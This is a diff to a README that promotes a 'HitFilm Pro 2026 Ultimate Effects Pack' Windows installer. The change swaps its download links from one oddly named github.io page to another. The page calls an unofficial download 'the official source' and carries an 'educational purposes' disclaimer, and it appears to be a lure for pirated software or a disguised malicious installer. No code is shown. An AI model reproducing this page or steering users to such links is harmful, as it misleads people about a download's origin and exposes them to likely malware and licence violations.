@@ -2,7 +2,7 @@
 
 Elevate your video production with the HitFilm Pro 2026 Ultimate Effects Pack. This tool provides a comprehensive suite of premium templates, composite effects, and professional plugins designed to unlock the full creative potential of HitFilm Pro on your Windows desktop. Whether you're a seasoned VFX artist or an emerging content creator, this package offers the tools to achieve stunning visual results.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## What's Inside
 
@@ -46,7 +46,7 @@ A: First, restart HitFilm Pro. If the effects are still not visible, go to `File
 
 To begin enhancing your HitFilm Pro experience, download the latest version of the Effects Pack installer from the official source.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 ---
 *Last Updated: October 2026. This tool is for educational and creative enhancement purposes. Always respect software licensing agreements.*
